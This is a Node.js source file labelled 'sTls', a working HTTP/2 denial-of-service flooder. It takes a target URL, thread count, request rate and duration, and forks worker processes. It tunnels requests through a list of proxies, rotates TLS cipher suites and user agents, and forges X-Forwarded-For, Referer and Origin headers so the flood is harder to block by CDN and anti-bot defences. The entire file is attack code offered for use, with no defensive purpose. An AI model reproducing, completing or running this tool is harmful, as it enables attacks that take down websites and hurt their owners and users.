//
//BY SXPPY.XYZ

process.on('uncaughtException', function(er) {});
process.on('unhandledRejection', function(er) {});

require('events').EventEmitter.defaultMaxListeners = Infinity;
process.setMaxListeners(0);

const execSync = require('child_process').execSync;
const fs = require('fs');
const cluster = require('cluster');
const http2 = require('http2');
const http = require('http');

try {
  var randstr = require('randomstring');
  var {
    constants
  } = require('crypto');
  var tls = require('tls');
  var url = require('url');
} catch {
  console.log('Installing govno...');
  execSync('npm install crypto randomstring tls url');
  process.exit();
};

try {
  var proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
  var uas = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (err) {
  if (err.code !== 'ENOENT') throw err;
  console.log('Proxy list / UA List not found. [proxy.txt] [ua.txt]');
  process.exit();
};

tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
tls.DEFAULT_ECDH_CURVE;
tls.authorized = true;
tls.sync = true;

if (process.argv.length < 7) {
  console.log('sTls / by https://sxppy.xyz / V 1.0');
  console.log('./sTls <target> <threads> <rate> <mode> <time>');
  process.exit(0);
}

let COOKIES = undefined;
let POSTDATA = undefined;

const cplist = [
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "DHE-RSA-AES128-CCM",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "DHE-PSK-AES128-GCM-SHA256",
  "DHE-RSA-AES256-CCM",
  "DHE-PSK-AES128-CCM8",
  "DHE-DSS-AES128-GCM-SHA256",
  "TLS_AES_128_GCM_SHA256",
  "DHE-PSK-AES256-GCM-SHA384",
  "DHE-PSK-AES256-CCM8",
  "DHE-RSA-AES128-CCM8",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "DHE-PSK-AES128-CCM",
  "TLS_AES_256_GCM_SHA384",
  "DHE-RSA-AES128-GCM-SHA256",
  "DHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES256-CCM",
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "DHE-PSK-AES256-CCM",
  "TLS_AES_128_CCM_SHA256",
  "ECDHE-ECDSA-AES128-CCM8",
  "DHE-RSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES256-GCM-SHA384",
  "DHE-DSS-AES256-GCM-SHA384",
  "ECDHE-ECDSA-AES256-CCM8",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES128-CCM",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "ALL:!aNULL:!ADH:!eNULL:!LOW:!EXP:RC4+RSA:+HIGH:+MEDIUM",
  "ALL:!aNULL:!eNULL",
  "EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
  "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
  "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
  ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
  "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
  "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
];

const rIp = () => {
  const r = () => Math.floor(Math.random() * 255);
  return `${r()}.${r()}.${r()}.${r()}`;
};

var parsed = url.parse(process.argv[2]);

let headerbuilders = {
  "Cache-Control": "max-age=0",
  'upgrade-insecure-requests': 1,
  ":method": process.argv[5],
  ":path": parsed.path,
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  'Accept-Encoding': 'gzip, deflate, br',
  'Accept-Language': 'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
  "sec-ch-ua-mobile": '?0',
  "sec-ch-ua-platform": '"Windows"',
  "sec-fetch-dest": 'empty',
  "sec-fetch-site": 'cross-site',
  "sec-fetch-mode": 'navigate',
  "sec-fetch-user": '?1',
  "TE": 'trailers',
  "Pragma": 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace'
};

if (cluster.isMaster) {

  for (let i = 0; i < process.argv[3]; i++) {
    cluster.fork();
  }

  setTimeout(() => {
    process.exit(1);
  }, process.argv[6] * 1000);


} else {
  startflood();
};

const agent = new http.Agent({
  keepAlive: true, // Keep sockets around even when there are no outstanding requests, so they can be used for future requests without having to reestablish a TCP connection. Defaults to false
  keepAliveMsecs: 50000, // When using the keepAlive option, specifies the initial delay for TCP Keep-Alive packets. Ignored when the keepAlive option is false or undefined. Defaults to 1000.
  maxSockets: Infinity,
  maxTotalSockets: Infinity,
  maxSockets: Infinity // Maximum number of sockets to leave open in a free state. Only relevant if keepAlive is set to true. Defaults to 256.
});

function startflood() {
  setInterval(() => {

    var cipper = cplist[Math.floor(Math.random() * cplist.length)];
    var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    var req = http.request({ //set proxy session
      host: proxy[0],
      agent: agent,
      globalAgent: agent,
      port: proxy[1],
      headers: {
        'Host': parsed.host,
        'Proxy-Connection': 'Keep-Alive',
        'Connection': 'Keep-Alive',
      },
      method: 'CONNECT',
      path: parsed.host + ':443'
    }, (err) => {
      req.end();
      return;
    }, function() {
      req.setSocketKeepAlive(true);
    });

    req.on('connect', function(res, socket, head) {

      const client = http2.connect(parsed.href, {
        createConnection: () => tls.connect({
          host: parsed.host,
          ciphers: cipper,
          secureProtocol: 'TLS_method',
          servername: parsed.host,
          curve: "GREASE:X25519:x25519",
          rejectUnauthorized: false,
          challengesToSolve: 5,
          cloudflareTimeout: 5000,
          cloudflareMaxTimeout: 30000,
          maxRedirects: 20,
          followAllRedirects: true,
          decodeEmails: false,
          gzip: true,
          secure: true,
          ALPNProtocols: ['h2'],
          sessionTimeout: 5000,
          socket: socket
        }, function() {

          for (let i = 0; i < process.argv[4]; i++) {

            headerbuilders["user-agent"] = uas[Math.floor(Math.random() * uas.length)];
            headerbuilders["X-Forwarded-For"] = rIp();
            headerbuilders["Referer"] = 'http://google.com/' + randstr.generate({
              length: 10,
              charset: "abcdefghijklmnopqstuvwxyz0123456789"
            });
            headerbuilders["Origin"] = 'http://' + randstr.generate({
              length: 8,
              charset: "abcdefghijklmnopqstuvwxyz0123456789"
            }) + '.com'

            const req = client.request(headerbuilders);
            req.end();
            req.on("response", () => {
              req.close();
            })
          };

        })
      });
    }).end();

    req.end();

  });

};